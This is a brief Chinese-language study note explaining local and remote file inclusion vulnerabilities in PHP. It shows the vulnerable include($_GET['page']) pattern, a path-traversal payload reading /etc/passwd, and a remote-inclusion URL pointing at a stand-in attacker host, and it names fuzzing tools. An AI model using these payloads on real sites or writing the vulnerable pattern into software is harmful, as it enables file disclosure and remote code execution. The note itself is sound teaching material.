# 文件包含

* `文件包含`=`File Inclusion`
  * ->
    * 文件包含漏洞
    * 文件包含攻击
  * 包括
    * `LFI`=`Local File Inclusion`=`本地文件包含`
    * `RFI`=`Remote File Inclusion`=`远程文件包含`
  * 问题根源：（往往是）url参数
  * 举例
    * 现有URL：`http://mywebsite.com/index.php?page=home.php`
      * 内部源码：`include($_GET['page']);`
    * 文件包含攻击
      * 本地文件包含
        * 返回上一级，访问其他（敏感信息）文件
        * `http://mywebsite.com/index.php?page=../../../etc/passwd`
      * 远程文件包含
        * 使用绝对路径地址，包含远程文件
          * `http//mywebsite.com/index.php?page=http://myhackerspage.com/rfi.php`
  * 相关工具
    * `Gobuster`
    * `Wfuzz`
    * `fimap`
